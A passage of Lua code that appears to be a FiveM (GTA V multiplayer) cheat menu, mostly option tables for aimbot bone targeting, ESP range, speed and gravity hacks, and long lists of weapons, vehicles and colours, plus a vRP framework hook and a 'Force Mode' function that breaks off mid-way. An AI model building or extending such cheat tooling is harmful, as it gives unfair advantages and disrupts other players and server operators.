	oldSpeed = nil


	ForcefieldRadiusOps = {5.0, 10.0, 15.0, 20.0, 50.0}

	ForcefieldRadius = 5.0


	FastCB = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49}
	FastCBWords = {"+0%", "+20%", "+40%", "+60%", "+80%", "+100%"}

	FastRunMultiplier = 1.0
	FastSwimMultiplier = 1.0


	RotationOps = {0, 45, 90, 135, 180}

	ObjRotation = 90


	GravityOps = {0.0, 5.0, 9.8, 50.0, 100.0, 200.0, 500.0, 1000.0, 9999.9}
	GravityOpsWords = {"0", "5", "Default", "50", "100", "200", "500", "1000", "9999"}

	GravAmount = 9.8


	SpeedModOps = {1.0, 1.5, 2.0, 3.0, 5.0, 10.0, 20.0, 50.0, 100.0, 500.0, 1000.0}
	SpeedModAmt = 1.0


	ESPDistanceOps = {50.0, 100.0, 500.0, 1000.0, 2000.0, 5000.0}
	EspDistance = 500.0


	ESPRefreshOps = {"0ms", "100ms", "250ms", "500ms", "1s", "2s", "5s"}
	ESPRefreshTime = 0


	AimbotBoneOps = {"Head", "Chest", "Left Arm", "Right Arm", "Left Leg", "Right Leg", "Dick"}
	AimbotBone = "SKEL_HEAD"


	ClothingSlots = {1, 2, 3, 4, 5}


	PedAttackOps = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}

	PedAttackType = 1


	RadiosList = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18}
	RadiosListWords = {
		"Los Santos Rock Radio",
		"Non-Stop-Pop FM",
		"Radio Los Santos",
		"Channel X",
		"West Coast Talk Radio",
		"Rebel Radio",
		"Soulwax FM",
		"East Los FM",
		"West Coast Classics",
		"Blue Ark",
		"Worldwide FM",
		"FlyLo FM",
		"The Lowdown 91.1",
		"The Lab",
		"Radio Mirror Park",
		"Space 103.2",
		"Vinewood Boulevard Radio",
		"Blonded Los Santos 97.8 FM",
		"Blaine County Radio",
	}


	WeathersList = {
		"CLEAR",
		"EXTRASUNNY",
		"CLOUDS",
		"OVERCAST",
		"RAIN",
		"CLEARING",
		"THUNDER",
		"SMOG",
		"FOGGY",
		"XMAS",
		"SNOWLIGHT",
		"BLIZZARD"
	}

	objs_tospawn = {
		"stt_prop_stunt_track_start",
		"prop_container_01a",
		"prop_contnr_pile_01a",
		"ce_xr_ctr2",
		"stt_prop_ramp_jump_xxl",
		"hei_prop_carrier_jet",
		"prop_parking_hut_2",
		"csx_seabed_rock3_",
		"db_apart_03_",
		"db_apart_09_",
		"stt_prop_stunt_tube_l",
		"stt_prop_stunt_track_dwuturn",
		"xs_prop_hamburgher_wl",
		"sr_prop_spec_tube_xxs_01a",
		"prop_air_bigradar",
		"p_tram_crash_s",
		"prop_windmill_01",
	}


	local allweapons = {
		"WEAPON_UNARMED",
		"WEAPON_KNIFE",
		"WEAPON_KNUCKLE",
		"WEAPON_NIGHTSTICK",
		"WEAPON_HAMMER",
		"WEAPON_BAT",
		"WEAPON_GOLFCLUB",
		"WEAPON_CROWBAR",
		"WEAPON_BOTTLE",
		"WEAPON_DAGGER",
		"WEAPON_HATCHET",
		"WEAPON_MACHETE",
		"WEAPON_FLASHLIGHT",
		"WEAPON_SWITCHBLADE",
		"WEAPON_POOLCUE",
		"WEAPON_PIPEWRENCH",


		"WEAPON_GRENADE",
		"WEAPON_STICKYBOMB",
		"WEAPON_PROXMINE",
		"WEAPON_BZGAS",
		"WEAPON_SMOKEGRENADE",
		"WEAPON_MOLOTOV",
		"WEAPON_FIREEXTINGUISHER",
		"WEAPON_PETROLCAN",
		"WEAPON_SNOWBALL",
		"WEAPON_FLARE",
		"WEAPON_BALL",


		"WEAPON_PISTOL",
		"WEAPON_PISTOL_MK2",
		"WEAPON_COMBATPISTOL",
		"WEAPON_APPISTOL",
		"WEAPON_REVOLVER",
		"WEAPON_REVOLVER_MK2",
		"WEAPON_DOUBLEACTION",
		"WEAPON_PISTOL50",
		"WEAPON_SNSPISTOL",
		"WEAPON_SNSPISTOL_MK2",
		"WEAPON_HEAVYPISTOL",
		"WEAPON_VINTAGEPISTOL",
		"WEAPON_STUNGUN",
		"WEAPON_FLAREGUN",
		"WEAPON_MARKSMANPISTOL",
		"WEAPON_RAYPISTOL",


		"WEAPON_MICROSMG",
		"WEAPON_MINISMG",
		"WEAPON_SMG",
		"WEAPON_SMG_MK2",
		"WEAPON_ASSAULTSMG",
		"WEAPON_COMBATPDW",
		"WEAPON_GUSENBERG",
		"WEAPON_MACHINEPISTOL",
		"WEAPON_MG",
		"WEAPON_COMBATMG",
		"WEAPON_COMBATMG_MK2",
		"WEAPON_RAYCARBINE",


		"WEAPON_ASSAULTRIFLE",
		"WEAPON_ASSAULTRIFLE_MK2",
		"WEAPON_CARBINERIFLE",
		"WEAPON_CARBINERIFLE_MK2",
		"WEAPON_ADVANCEDRIFLE",
		"WEAPON_SPECIALCARBINE",
		"WEAPON_SPECIALCARBINE_MK2",
		"WEAPON_BULLPUPRIFLE",
		"WEAPON_BULLPUPRIFLE_MK2",
		"WEAPON_COMPACTRIFLE",


		"WEAPON_PUMPSHOTGUN",
		"WEAPON_PUMPSHOTGUN_MK2",
		"WEAPON_SWEEPERSHOTGUN",
		"WEAPON_SAWNOFFSHOTGUN",
		"WEAPON_BULLPUPSHOTGUN",
		"WEAPON_ASSAULTSHOTGUN",
		"WEAPON_MUSKET",
		"WEAPON_HEAVYSHOTGUN",
		"WEAPON_DBSHOTGUN",


		"WEAPON_SNIPERRIFLE",
		"WEAPON_HEAVYSNIPER",
		"WEAPON_HEAVYSNIPER_MK2",
		"WEAPON_MARKSMANRIFLE",
		"WEAPON_MARKSMANRIFLE_MK2",


		"WEAPON_GRENADELAUNCHER",
		"WEAPON_GRENADELAUNCHER_SMOKE",
		"WEAPON_RPG",
		"WEAPON_MINIGUN",
		"WEAPON_FIREWORK",
		"WEAPON_RAILGUN",
		"WEAPON_HOMINGLAUNCHER",
		"WEAPON_COMPACTLAUNCHER",
		"WEAPON_RAYMINIGUN",
	}

	local meleeweapons = {
		{"WEAPON_KNIFE", "Knife"},
		{"WEAPON_KNUCKLE", "Brass Knuckles"},
		{"WEAPON_NIGHTSTICK", "Nightstick"},
		{"WEAPON_HAMMER", "Hammer"},
		{"WEAPON_BAT", "Baseball Bat"},
		{"WEAPON_GOLFCLUB", "Golf Club"},
		{"WEAPON_CROWBAR", "Crowbar"},
		{"WEAPON_BOTTLE", "Bottle"},
		{"WEAPON_DAGGER", "Dagger"},
		{"WEAPON_HATCHET", "Hatchet"},
		{"WEAPON_MACHETE", "Machete"},
		{"WEAPON_FLASHLIGHT", "Flashlight"},
		{"WEAPON_SWITCHBLADE", "Switchblade"},
		{"WEAPON_POOLCUE", "Pool Cue"},
		{"WEAPON_PIPEWRENCH", "Pipe Wrench"}
	}

	local thrownweapons = {
		{"WEAPON_GRENADE", "Grenade"},
		{"WEAPON_STICKYBOMB", "Sticky Bomb"},
		{"WEAPON_PROXMINE", "Proximity Mine"},
		{"WEAPON_BZGAS", "BZ Gas"},
		{"WEAPON_SMOKEGRENADE", "Smoke Grenade"},
		{"WEAPON_MOLOTOV", "Molotov"},
		{"WEAPON_FIREEXTINGUISHER", "Fire Extinguisher"},
		{"WEAPON_PETROLCAN", "Fuel Can"},
		{"WEAPON_SNOWBALL", "Snowball"},
		{"WEAPON_FLARE", "Flare"},
		{"WEAPON_BALL", "Baseball"}
	}

	local pistolweapons = {
		{"WEAPON_PISTOL", "Pistol"},
		{"WEAPON_PISTOL_MK2", "Pistol Mk II"},
		{"WEAPON_COMBATPISTOL", "Combat Pistol"},
		{"WEAPON_APPISTOL", "AP Pistol"},
		{"WEAPON_REVOLVER", "Revolver"},
		{"WEAPON_REVOLVER_MK2", "Revolver Mk II"},
		{"WEAPON_DOUBLEACTION", "Double Action Revolver"},
		{"WEAPON_PISTOL50", "Pistol .50"},
		{"WEAPON_SNSPISTOL", "SNS Pistol"},
		{"WEAPON_SNSPISTOL_MK2", "SNS Pistol Mk II"},
		{"WEAPON_HEAVYPISTOL", "Heavy Pistol"},
		{"WEAPON_VINTAGEPISTOL", "Vintage Pistol"},
		{"WEAPON_STUNGUN", "Tazer"},
		{"WEAPON_FLAREGUN", "Flaregun"},
		{"WEAPON_MARKSMANPISTOL", "Marksman Pistol"},
		{"WEAPON_RAYPISTOL", "Up-n-Atomizer"}
	}

	local smgweapons = {
		{"WEAPON_MICROSMG", "Micro SMG"},
		{"WEAPON_MINISMG", "Mini SMG"},
		{"WEAPON_SMG", "SMG"},
		{"WEAPON_SMG_MK2", "SMG Mk II"},
		{"WEAPON_ASSAULTSMG", "Assault SMG"},
		{"WEAPON_COMBATPDW", "Combat PDW"},
		{"WEAPON_GUSENBERG", "Gunsenberg"},
		{"WEAPON_MACHINEPISTOL", "Machine Pistol"},
		{"WEAPON_MG", "MG"},
		{"WEAPON_COMBATMG", "Combat MG"},
		{"WEAPON_COMBATMG_MK2", "Combat MG Mk II"},
		{"WEAPON_RAYCARBINE", "Unholy Hellbringer"}
	}

	local assaultweapons = {
		{"WEAPON_ASSAULTRIFLE", "Assault Rifle"},
		{"WEAPON_ASSAULTRIFLE_MK2", "Assault Rifle Mk II"},
		{"WEAPON_CARBINERIFLE", "Carbine Rifle"},
		{"WEAPON_CARBINERIFLE_MK2", "Carbine Rigle Mk II"},
		{"WEAPON_ADVANCEDRIFLE", "Advanced Rifle"},
		{"WEAPON_SPECIALCARBINE", "Special Carbine"},
		{"WEAPON_SPECIALCARBINE_MK2", "Special Carbine Mk II"},
		{"WEAPON_BULLPUPRIFLE", "Bullpup Rifle"},
		{"WEAPON_BULLPUPRIFLE_MK2", "Bullpup Rifle Mk II"},
		{"WEAPON_COMPACTRIFLE", "Compact Rifle"}
	}

	local shotgunweapons = {
		{"WEAPON_PUMPSHOTGUN", "Pump Shotgun"},
		{"WEAPON_PUMPSHOTGUN_MK2", "Pump Shotgun Mk II"},
		{"WEAPON_SWEEPERSHOTGUN", "Sweeper Shotgun"},
		{"WEAPON_SAWNOFFSHOTGUN", "Sawed-Off Shotgun"},
		{"WEAPON_BULLPUPSHOTGUN", "Bullpup Shotgun"},
		{"WEAPON_ASSAULTSHOTGUN", "Assault Shotgun"},
		{"WEAPON_MUSKET", "Musket"},
		{"WEAPON_HEAVYSHOTGUN", "Heavy Shotgun"},
		{"WEAPON_DBSHOTGUN", "Double Barrel Shotgun"}
	}

	local sniperweapons = {
		{"WEAPON_SNIPERRIFLE", "Sniper Rifle"},
		{"WEAPON_HEAVYSNIPER", "Heavy Sniper"},
		{"WEAPON_HEAVYSNIPER_MK2", "Heavy Sniper Mk II"},
		{"WEAPON_MARKSMANRIFLE", "Marksman Rifle"},
		{"WEAPON_MARKSMANRIFLE_MK2", "Marksman Rifle Mk II"}
	}

	local heavyweapons = {
		{"WEAPON_GRENADELAUNCHER", "Grenade Launcher"},
		{"WEAPON_RPG", "RPG"},
		{"WEAPON_MINIGUN", "Minigun"},
		{"WEAPON_FIREWORK", "Firework Launcher"},
		{"WEAPON_RAILGUN", "Railgun"},
		{"WEAPON_HOMINGLAUNCHER", "Homing Launcher"},
		{"WEAPON_COMPACTLAUNCHER", "Compact Grenade Launcher"},
		{"WEAPON_RAYMINIGUN", "Widowmaker"}
	}

	local compacts = {
		"BLISTA",
		"BRIOSO",
		"DILETTANTE",
		"DILETTANTE2",
		"ISSI2",
		"ISSI3",
		"ISSI4",
		"ISSI5",
		"ISSI6",
		"PANTO",
		"PRAIRIE",
		"RHAPSODY"
	}

	local sedans = {
		"ASEA",
		"ASEA2",
		"ASTEROPE",
		"COG55",
		"COG552",
		"COGNOSCENTI",
		"COGNOSCENTI2",
		"EMPEROR",
		"EMPEROR2",
		"EMPEROR3",
		"FUGITIVE",
		"GLENDALE",
		"INGOT",
		"INTRUDER",
		"LIMO2",
		"PREMIER",
		"PRIMO",
		"PRIMO2",
		"REGINA",
		"ROMERO",
		"SCHAFTER2",
		"SCHAFTER5",
		"SCHAFTER6",
		"STAFFORD",
		"STANIER",
		"STRATUM",
		"STRETCH",
		"SUPERD",
		"SURGE",
		"TAILGATER",
		"WARRENER",
		"WASHINGTON"
	}

	local suvs = {
		"BALLER",
		"BALLER2",
		"BALLER3",
		"BALLER4",
		"BALLER5",
		"BALLER6",
		"BJXL",
		"CAVALCADE",
		"CAVALCADE2",
		"CONTENDER",
		"DUBSTA",
		"DUBSTA2",
		"FQ2",
		"GRANGER",
		"GRESLEY",
		"HABANERO",
		"HUNTLEY",
		"LANDSTALKER",
		"MESA",
		"MESA2",
		"PATRIOT",
		"PATRIOT2",
		"RADI",
		"ROCOTO",
		"SEMINOLE",
		"SERRANO",
		"TOROS",
		"XLS",
		"XLS2"
	}

	local coupes = {
		"COGCABRIO",
		"EXEMPLAR",
		"F620",
		"FELON",
		"FELON2",
		"JACKAL",
		"ORACLE",
		"ORACLE2",
		"SENTINEL",
		"SENTINEL2",
		"WINDSOR",
		"WINDSOR2",
		"ZION",
		"ZION2"
	}

	local muscle = {
		"BLADE",
		"BUCCANEER",
		"BUCCANEER2",
		"CHINO",
		"CHINO2",
		"CLIQUE",
		"COQUETTE3",
		"DEVIANT",
		"DOMINATOR",
		"DOMINATOR2",
		"DOMINATOR3",
		"DOMINATOR4",
		"DOMINATOR5",
		"DOMINATOR6",
		"DUKES",
		"DUKES2",
		"ELLIE",
		"FACTION",
		"FACTION2",
		"FACTION3",
		"GAUNTLET",
		"GAUNTLET2",
		"HERMES",
		"HOTKNIFE",
		"HUSTLER",
		"IMPALER",
		"IMPALER2",
		"IMPALER3",
		"IMPALER4",
		"IMPERATOR",
		"IMPERATOR2",
		"IMPERATOR3",
		"LURCHER",
		"MOONBEAM",
		"MOONBEAM2",
		"NIGHTSHADE",
		"PHOENIX",
		"PICADOR",
		"RATLOADER",
		"RATLOADER2",
		"RUINER",
		"RUINER2",
		"RUINER3",
		"SABREGT",
		"SABREGT2",
		"SLAMVAN",
		"SLAMVAN2",
		"SLAMVAN3",
		"SLAMVAN4",
		"SLAMVAN5",
		"SLAMVAN6",
		"STALION",
		"STALION2",
		"TAMPA",
		"TAMPA3",
		"TULIP",
		"VAMOS",
		"VIGERO",
		"VIRGO",
		"VIRGO2",
		"VIRGO3",
		"VOODOO",
		"VOODOO2",
		"YOSEMITE"
	}

	local sportsclassics = {
		"ARDENT",
		"BTYPE",
		"BTYPE2",
		"BTYPE3",
		"CASCO",
		"CHEBUREK",
		"CHEETAH2",
		"COQUETTE2",
		"DELUXO",
		"FAGALOA",
		"FELTZER3",
		"GT500",
		"INFERNUS2",
		"JB700",
		"JESTER3",
		"MAMBA",
		"MANANA",
		"MICHELLI",
		"MONROE",
		"PEYOTE",
		"PIGALLE",
		"RAPIDGT3",
		"RETINUE",
		"SAVESTRA",
		"STINGER",
		"STINGERGT",
		"STROMBERG",
		"SWINGER",
		"TORERO",
		"TORNADO",
		"TORNADO2",
		"TORNADO3",
		"TORNADO4",
		"TORNADO5",
		"TORNADO6",
		"TURISMO2",
		"VISERIS",
		"Z190",
		"ZTYPE"
	}

	local sports = {
		"ALPHA",
		"BANSHEE",
		"BESTIAGTS",
		"BLISTA2",
		"BLISTA3",
		"BUFFALO",
		"BUFFALO2",
		"BUFFALO3",
		"CARBONIZZARE",
		"COMET2",
		"COMET3",
		"COMET4",
		"COMET5",
		"COQUETTE",
		"ELEGY",
		"ELEGY2",
		"FELTZER2",
		"FLASHGT",
		"FUROREGT",
		"FUSILADE",
		"FUTO",
		"GB200",
		"HOTRING",
		"ITALIGTO",
		"JESTER",
		"JESTER2",
		"KHAMELION",
		"KURUMA",
		"KURUMA2",
		"LYNX",
		"MASSACRO",
		"MASSACRO2",
		"NEON",
		"NINEF",
		"NINEF2",
		"OMNIS",
		"PARIAH",
		"PENUMBRA",
		"RAIDEN",
		"RAPIDGT",
		"RAPIDGT2",
		"RAPTOR",
		"REVOLTER",
		"RUSTON",
		"SCHAFTER2",
		"SCHAFTER3",
		"SCHAFTER4",
		"SCHAFTER5",
		"SCHLAGEN",
		"SCHWARZER",
		"SENTINEL3",
		"SEVEN70",
		"SPECTER",
		"SPECTER2",
		"SULTAN",
		"SURANO",
		"TAMPA2",
		"TROPOS",
		"VERLIERER2",
		"ZR380",
		"ZR3802",
		"ZR3803"
	}

	local super = {
		"ADDER",
		"AUTARCH",
		"BANSHEE2",
		"BULLET",
		"CHEETAH",
		"CYCLONE",
		"DEVESTE",
		"ENTITYXF",
		"ENTITY2",
		"FMJ",
		"GP1",
		"INFERNUS",
		"ITALIGTB",
		"ITALIGTB2",
		"LE7B",
		"NERO",
		"NERO2",
		"OSIRIS",
		"PENETRATOR",
		"PFISTER811",
		"PROTOTIPO",
		"REAPER",
		"SC1",
		"SCRAMJET",
		"SHEAVA",
		"SULTANRS",
		"T20",
		"TAIPAN",
		"TEMPESTA",
		"TEZERACT",
		"TURISMOR",
		"TYRANT",
		"TYRUS",
		"VACCA",
		"VAGNER",
		"VIGILANTE",
		"VISIONE",
		"VOLTIC",
		"VOLTIC2",
		"XA21",
		"ZENTORNO"
	}

	local motorcycles = {
		"AKUMA",
		"AVARUS",
		"BAGGER",
		"BATI",
		"BATI2",
		"BF400",
		"CARBONRS",
		"CHIMERA",
		"CLIFFHANGER",
		"DAEMON",
		"DAEMON2",
		"DEFILER",
		"DEATHBIKE",
		"DEATHBIKE2",
		"DEATHBIKE3",
		"DIABLOUS",
		"DIABLOUS2",
		"DOUBLE",
		"ENDURO",
		"ESSKEY",
		"FAGGIO",
		"FAGGIO2",
		"FAGGIO3",
		"FCR",
		"FCR2",
		"GARGOYLE",
		"HAKUCHOU",
		"HAKUCHOU2",
		"HEXER",
		"INNOVATION",
		"LECTRO",
		"MANCHEZ",
		"NEMESIS",
		"NIGHTBLADE",
		"OPPRESSOR",
		"OPPRESSOR2",
		"PCJ",
		"RATBIKE",
		"RUFFIAN",
		"SANCHEZ",
		"SANCHEZ2",
		"SANCTUS",
		"SHOTARO",
		"SOVEREIGN",
		"THRUST",
		"VADER",
		"VINDICATOR",
		"VORTEX",
		"WOLFSBANE",
		"ZOMBIEA",
		"ZOMBIEB"
	}

	local offroad = {
		"BFINJECTION",
		"BIFTA",
		"BLAZER",
		"BLAZER2",
		"BLAZER3",
		"BLAZER4",
		"BLAZER5",
		"BODHI2",
		"BRAWLER",
		"BRUISER",
		"BRUISER2",
		"BRUISER3",
		"BRUTUS",
		"BRUTUS2",
		"BRUTUS3",
		"CARACARA",
		"DLOADER",
		"DUBSTA3",
		"DUNE",
		"DUNE2",
		"DUNE3",
		"DUNE4",
		"DUNE5",
		"FREECRAWLER",
		"INSURGENT",
		"INSURGENT2",
		"INSURGENT3",
		"KALAHARI",
		"KAMACHO",
		"MARSHALL",
		"MENACER",
		"MESA3",
		"MONSTER",
		"MONSTER3",
		"MONSTER4",
		"MONSTER5",
		"NIGHTSHARK",
		"RANCHERXL",
		"RANCHERXL2",
		"RCBANDITO",
		"REBEL",
		"REBEL2",
		"RIATA",
		"SANDKING",
		"SANDKING2",
		"TECHNICAL",
		"TECHNICAL2",
		"TECHNICAL3",
		"TROPHYTRUCK",
		"TROPHYTRUCK2"
	}

	local industrial = {
		"BULLDOZER",
		"CUTTER",
		"DUMP",
		"FLATBED",
		"GUARDIAN",
		"HANDLER",
		"MIXER",
		"MIXER2",
		"RUBBLE",
		"TIPTRUCK",
		"TIPTRUCK2"
	}

	local utility = {
		"AIRTUG",
		"CADDY",
		"CADDY2",
		"CADDY3",
		"DOCKTUG",
		"FORKLIFT",
		"TRACTOR2",
		"TRACTOR3",
		"MOWER",
		"RIPLEY",
		"SADLER",
		"SADLER2",
		"SCRAP",
		"TOWTRUCK",
		"TOWTRUCK2",
		"TRACTOR",
		"UTILLITRUCK",
		"UTILLITRUCK2",
		"UTILLITRUCK3",
		"ARMYTRAILER",
		"ARMYTRAILER2",
		"FREIGHTTRAILER",
		"ARMYTANKER",
		"TRAILERLARGE",
		"DOCKTRAILER",
		"TR3",
		"TR2",
		"TR4",
		"TRFLAT",
		"TRAILERS",
		"TRAILERS4",
		"TRAILERS2",
		"TRAILERS3",
		"TVTRAILER",
		"TRAILERLOGS",
		"TANKER",
		"TANKER2",
		"BALETRAILER",
		"GRAINTRAILER",
		"BOATTRAILER",
		"RAKETRAILER",
		"TRAILERSMALL"
	}

	local vans = {
		"BISON",
		"BISON2",
		"BISON3",
		"BOBCATXL",
		"BOXVILLE",
		"BOXVILLE2",
		"BOXVILLE3",
		"BOXVILLE4",
		"BOXVILLE5",
		"BURRITO",
		"BURRITO2",
		"BURRITO3",
		"BURRITO4",
		"BURRITO5",
		"CAMPER",
		"GBURRITO",
		"GBURRITO2",
		"JOURNEY",
		"MINIVAN",
		"MINIVAN2",
		"PARADISE",
		"PONY",
		"PONY2",
		"RUMPO",
		"RUMPO2",
		"RUMPO3",
		"SPEEDO",
		"SPEEDO2",
		"SPEEDO4",
		"SURFER",
		"SURFER2",
		"TACO",
		"YOUGA",
		"YOUGA2"
	}

	local cycles = {
		"BMX",
		"CRUISER",
		"FIXTER",
		"SCORCHER",
		"TRIBIKE",
		"TRIBIKE2",
		"TRIBIKE3"
	}

	local boats = {
		"DINGHY",
		"DINGHY2",
		"DINGHY3",
		"DINGHY4",
		"JETMAX",
		"MARQUIS",
		"PREDATOR",
		"SEASHARK",
		"SEASHARK2",
		"SEASHARK3",
		"SPEEDER",
		"SPEEDER2",
		"SQUALO",
		"SUBMERSIBLE",
		"SUBMERSIBLE2",
		"SUNTRAP",
		"TORO",
		"TORO2",
		"TROPIC",
		"TROPIC2",
		"TUG"
	}

	local helicopters = {
		"AKULA",
		"ANNIHILATOR",
		"BUZZARD",
		"BUZZARD2",
		"CARGOBOB",
		"CARGOBOB2",
		"CARGOBOB3",
		"CARGOBOB4",
		"FROGGER",
		"FROGGER2",
		"HAVOK",
		"HUNTER",
		"MAVERICK",
		"POLMAV",
		"SAVAGE",
		"SEASPARROW",
		"SKYLIFT",
		"SUPERVOLITO",
		"SUPERVOLITO2",
		"SWIFT",
		"SWIFT2",
		"VALKYRIE",
		"VALKYRIE2",
		"VOLATUS"
	}


	local planes = {
		"ALPHAZ1",
		"AVENGER",
		"AVENGER2",
		"BESRA",
		"BLIMP",
		"BLIMP2",
		"BLIMP3",
		"BOMBUSHKA",
		"CARGOPLANE",
		"CUBAN800",
		"DODO",
		"DUSTER",
		"HOWARD",
		"HYDRA",
		"JET",
		"LAZER",
		"LUXOR",
		"LUXOR2",
		"MAMMATUS",
		"MICROLIGHT",
		"MILJET",
		"MOGUL",
		"MOLOTOK",
		"NIMBUS",
		"NOKOTA",
		"PYRO",
		"ROGUE",
		"SEABREEZE",
		"SHAMAL",
		"STARLING",
		"STRIKEFORCE",
		"STUNT",
		"TITAN",
		"TULA",
		"VELUM",
		"VELUM2",
		"VESTRA",
		"VOLATOL"
	}

	local service = {
		"AIRBUS",
		"BRICKADE",
		"BUS",
		"COACH",
		"PBUS2",
		"RALLYTRUCK",
		"RENTALBUS",
		"TAXI",
		"TOURBUS",
		"TRASH",
		"TRASH2",
		"WASTELANDER",
		"AMBULANCE",
		"FBI",
		"FBI2",
		"FIRETRUK",
		"LGUARD",
		"PBUS",
		"POLICE",
		"POLICE2",
		"POLICE3",
		"POLICE4",
		"POLICEB",
		"POLICEOLD1",
		"POLICEOLD2",
		"POLICET",
		"POLMAV",
		"PRANGER",
		"PREDATOR",
		"RIOT",
		"RIOT2",
		"SHERIFF",
		"SHERIFF2",
		"APC",
		"BARRACKS",
		"BARRACKS2",
		"BARRACKS3",
		"BARRAGE",
		"CHERNOBOG",
		"CRUSADER",
		"HALFTRACK",
		"KHANJALI",
		"RHINO",
		"SCARAB",
		"SCARAB2",
		"SCARAB3",
		"THRUSTER",
		"TRAILERSMALL2"
	}

	local commercial = {
		"BENSON",
		"BIFF",
		"CERBERUS",
		"CERBERUS2",
		"CERBERUS3",
		"HAULER",
		"HAULER2",
		"MULE",
		"MULE2",
		"MULE3",
		"MULE4",
		"PACKER",
		"PHANTOM",
		"PHANTOM2",
		"PHANTOM3",
		"POUNDER",
		"POUNDER2",
		"STOCKADE",
		"STOCKADE3",
		"TERBYTE",
		"CABLECAR",
		"FREIGHT",
		"FREIGHTCAR",
		"FREIGHTCONT1",
		"FREIGHTCONT2",
		"FREIGHTGRAIN",
		"METROTRAIN",
		"TANKERCAR"
	}

	-- END VEHICLES LISTS
	-- VEHICLE MODS LIST (this is going to take a while...)
	local classicColors = {
		{"Black", 0},
		{"Carbon Black", 147},
		{"Graphite", 1},
		{"Anhracite Black", 11},
		{"Black Steel", 2},
		{"Dark Steel", 3},
		{"Silver", 4},
		{"Bluish Silver", 5},
		{"Rolled Steel", 6},
		{"Shadow Silver", 7},
		{"Stone Silver", 8},
		{"Midnight Silver", 9},
		{"Cast Iron Silver", 10},
		{"Red", 27},
		{"Torino Red", 28},
		{"Formula Red", 29},
		{"Lava Red", 150},
		{"Blaze Red", 30},
		{"Grace Red", 31},
		{"Garnet Red", 32},
		{"Sunset Red", 33},
		{"Cabernet Red", 34},
		{"Wine Red", 143},
		{"Candy Red", 35},
		{"Hot Pink", 135},
		{"Pfsiter Pink", 137},
		{"Salmon Pink", 136},
		{"Sunrise Orange", 36},
		{"Orange", 38},
		{"Bright Orange", 138},
		{"Gold", 99},
		{"Bronze", 90},
		{"Yellow", 88},
		{"Race Yellow", 89},
		{"Dew Yellow", 91},
		{"Dark Green", 49},
		{"Racing Green", 50},
		{"Sea Green", 51},
		{"Olive Green", 52},
		{"Bright Green", 53},
		{"Gasoline Green", 54},
		{"Lime Green", 92},
		{"Midnight Blue", 141},
		{"Galaxy Blue", 61},
		{"Dark Blue", 62},
		{"Saxon Blue", 63},
		{"Blue", 64},
		{"Mariner Blue", 65},
		{"Harbor Blue", 66},
		{"Diamond Blue", 67},
		{"Surf Blue", 68},
		{"Nautical Blue", 69},
		{"Racing Blue", 73},
		{"Ultra Blue", 70},
		{"Light Blue", 74},
		{"Chocolate Brown", 96},
		{"Bison Brown", 101},
		{"Creeen Brown", 95},
		{"Feltzer Brown", 94},
		{"Maple Brown", 97},
		{"Beechwood Brown", 103},
		{"Sienna Brown", 104},
		{"Saddle Brown", 98},
		{"Moss Brown", 100},
		{"Woodbeech Brown", 102},
		{"Straw Brown", 99},
		{"Sandy Brown", 105},
		{"Bleached Brown", 106},
		{"Schafter Purple", 71},
		{"Spinnaker Purple", 72},
		{"Midnight Purple", 142},
		{"Bright Purple", 145},
		{"Cream", 107},
		{"Ice White", 111},
		{"Frost White", 112}
	}

	local matteColors = {
		{"Black", 12},
		{"Gray", 13},
		{"Light Gray", 14},
		{"Ice White", 131},
		{"Blue", 83},
		{"Dark Blue", 82},
		{"Midnight Blue", 84},
		{"Midnight Purple", 149},
		{"Schafter Purple", 148},
		{"Red", 39},
		{"Dark Red", 40},
		{"Orange", 41},
		{"Yellow", 42},
		{"Lime Green", 55},
		{"Green", 128},
		{"Forest Green", 151},
		{"Foliage Green", 155},
		{"Olive Darb", 152},
		{"Dark Earth", 153},
		{"Desert Tan", 154}
	}

	local metalColors = {
		{"Brushed Steel", 117},
		{"Brushed Black Steel", 118},
		{"Brushed Aluminum", 119},
		{"Chrome", 120},
		{"Pure Gold", 158},
		{"Brushed Gold", 159}
	}


	local Keys = {
		["ESC"] = 322, ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F5"] = 166, ["F6"] = 167, ["F7"] = 168, ["F8"] = 169, ["F9"] = 56, ["F10"] = 57,
		["~"] = 243, ["1"] = 157, ["2"] = 158, ["3"] = 160, ["4"] = 164, ["5"] = 165, ["6"] = 159, ["7"] = 161, ["8"] = 162, ["9"] = 163, ["-"] = 84, ["="] = 83, ["BACKSPACE"] = 177,
		["TAB"] = 37, ["Q"] = 44, ["W"] = 32, ["E"] = 38, ["R"] = 45, ["T"] = 245, ["Y"] = 246, ["U"] = 303, ["P"] = 199, ["["] = 39, ["]"] = 40, ["ENTER"] = 18,
		["CAPS"] = 137, ["A"] = 34, ["S"] = 8, ["D"] = 9, ["F"] = 23, ["G"] = 47, ["H"] = 74, ["K"] = 311, ["L"] = 182,
		["LEFTSHIFT"] = 21, ["Z"] = 20, ["X"] = 73, ["C"] = 26, ["V"] = 0, ["B"] = 29, ["N"] = 249, ["M"] = 244, [","] = 82, ["."] = 81,
		["LEFTCTRL"] = 36, ["LEFTALT"] = 19, ["SPACE"] = 22, ["RIGHTCTRL"] = 70,
		["HOME"] = 213, ["PAGEUP"] = 10, ["PAGEDOWN"] = 11, ["DELETE"] = 178,
		["LEFT"] = 174, ["RIGHT"] = 175, ["TOP"] = 27, ["DOWN"] = 173,
		["NENTER"] = 201, ["N4"] = 108, ["N5"] = 60, ["N6"] = 107, ["N+"] = 96, ["N-"] = 97, ["N7"] = 117, ["N8"] = 61, ["N9"] = 118,
		["MOUSE1"] = 24
	}

	local currentMenuX = 1
	local selectedMenuX = 1
	local currentMenuY = 1
	local selectedMenuY = 1
	local menuX = { 0.75, 0.025, 0.1, 0.2, 0.3, 0.4, 0.5, 0.6, 0.7 }
	local menuY = { 0.1, 0.025, 0.2, 0.3 , 0.400, 0.425 }

	vRP = Proxy.getInterface("vRP")


	local function ForceMod()
		ForceTog = not ForceTog

		if ForceTog then

			Citizen.CreateThread(function()
				ShowInfo("Force Mode ~g~[ON] ~g~\n~s~Active Mode -» KEY ~y~[E] ")

				local ForceKey = Keys["E"]
				local Force = 0.5
				local KeyPressed = false
				local KeyTimer = 0
				local KeyDelay = 15
				local ForceEnabled = false
				local StartPush = false

				function forcetick()

					if (KeyPressed) then
						KeyTimer = KeyTimer + 1
						if (KeyTimer >= KeyDelay) then
							KeyTimer = 0
							KeyPressed = false
